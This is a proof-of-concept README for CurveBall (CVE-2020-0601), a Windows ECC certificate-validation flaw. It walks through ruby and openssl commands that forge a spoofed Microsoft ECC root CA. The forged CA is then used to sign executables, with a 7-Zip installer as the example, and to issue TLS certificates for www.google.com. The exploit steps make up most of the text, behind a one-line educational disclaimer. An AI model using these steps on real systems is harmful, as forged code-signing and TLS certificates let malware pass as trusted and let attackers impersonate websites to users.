# CurveBall (CVE-2020-0601) - PoC
CVE-2020-0601, or commonly referred to as CurveBall, is a vulnerability in which the signature of certificates using elliptic curve cryptography (ECC) is not correctly verified. 

ECC relies on different parameters. These parameters are standardized for many curves. However, Microsoft didn't check all these parameters. The parameter `G` (the generator) was not checked, and the attacker can therefore supply his own generator, such that when Microsoft tries to validate the certificate against a trusted CA, it'll only look for matching public keys, and then use then use the generator of the certificate. NSA explains the impact of this vulnerability and more [here](https://media.defense.gov/2020/Jan/14/2002234275/-1/-1/0/CSA-WINDOWS-10-CRYPT-LIB-20190114.PDF).

`MicrosoftECCProductRootCertificateAuthority.cer` is by default a trusted root certificate authority (CA) using ECC on Windows 10. Anything signed with this certificate will therefore automatically be trusted.  

**Minimum requirements**
`openssl 1.1.0`
`ruby 2.4.0`

## Mathematical details
If you're interested in the mathematical details of the vulnerability, please read more [here](https://news.ycombinator.com/item?id=22048619).

In order to spoof the certificate, we set the following parameters:

    d' = 1
    G' = Q
Such that `Q = Q' = d'G'`.

## Usage
Create a certificate with the same public key and parameters of a trusted CA. This will be used as our spoofing CA. Set the generator to a value, where you know the private key. You can easily set the generator to the public key, and have a private key set to `1`, since `Q = dG`.

Next up, you create a certificate signing request with the extensions you wish to use, e.g. code signing or server authentication.

Sign this certificate request with your spoofed CA and CA key, and add the usage extensions.

Bundle the signed certificate request (now a regular certificate) with the spoofed CA, and you have a signed and trusted certificate. 

When Windows checks whether the certificate is trusted, it'll see that it has been signed by our spoofed CA. It then looks at the spoofed CA's public key to check against trusted CA's. Then it simply verifies the signature of our spoofed CA with the spoofed CA's generator - this is the issue.

If you choose to open your newly and signed, trusted certificate in Windows, it'll not recognize it as trusted, since it hasn't been tied to anything, thus it will not use the spoofed CA. The certificate must always present itself with the spoofed CA.

## Code Signing
*Please use this for educational and researching purposes only.* 

Extract the public key from the CA and modify it according to the vulnerability:

    ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer
Generate a new x509 certificate based on this key. This will be our own spoofed CA.

    openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
Generate a new key. This key can be of any type you want. It will be used to create a code signing certificate, which we will sign with our own CA.

    openssl ecparam -name secp384r1 -genkey -noout -out cert.key
Next up, create a new  certificate signing request (CSR). This request will oftenly be sent to trusted CA's, but since we have a spoofed one, we can sign it ourselves.

    openssl req -new -key cert.key -out cert.csr -config openssl_cs.conf -reqexts v3_cs
Sign your new CSR with our spoofed CA and CA key. This certificate will expire in 2047, whereas the real trusted Microsoft CA will expire in 2043.

    openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_cs.conf -extensions v3_cs
The only thing left is to pack the certificate, its key and the spoofed CA into a PKCS12 file for signing executables.

    openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile spoofed_ca.crt -name "Code Signing" -out cert.p12
Sign your executable with PKCS12 file.

    osslsigncode sign -pkcs12 cert.p12 -n "Signed by ollypwn" -in 7z1900-x64.exe -out 7z1900-x64_signed.exe

## SSL/TLS
*Please use this for educational and researching purposes only.* 
Extract the public key from the CA and modify it according to the vulnerability:

    ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer
Generate a new x509 certificate based on this key. This will be our own spoofed CA.

    openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
Generate a new key. This key be of any type you want. It will be used to create a SSL certificate, which we will sign with our own CA.

    openssl ecparam -name secp384r1 -genkey -noout -out cert.key
Next up, create a new  certificate signing request (CSR). This request will oftenly be sent to trusted CA's, but since we have a spoofed one, we can sign it ourselves.

If you wish to change the domain name, edit `CN  = www.google.com` to `CN  = www.example.com` inside of `openssl_tls.conf`.

    openssl req -new -key cert.key -out cert.csr -config openssl_tls.conf -reqexts v3_tls
Sign your new CSR with our spoofed CA and CA key. This certificate will expire in 2047, whereas the real trusted Microsoft CA will expire in 2043.

    openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls
You can now use `cert.crt`, `cert.key`, and `spoofed_ca.crt` to serve your content. Again, remember to add the spoofed_ca.crt as a certificate chain in your server's HTTPS configuration.

See the usage example in [tls/index.js](https://github.com/ollypwn/CVE-2020-0601/blob/master/tls/index.js).
